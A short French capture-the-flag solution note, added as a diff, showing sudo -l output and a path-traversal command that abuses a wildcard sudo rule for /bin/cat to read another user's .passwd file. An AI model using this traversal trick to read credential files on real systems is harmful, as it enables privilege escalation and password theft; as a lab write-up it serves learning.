@@ -1,0 +1,5 @@
+sudo -l nous indique ça : 
+    User app-script-ch1 may run the following commands on challenge02:
+        (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
+Il suffit donc de faire ça :
+    sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
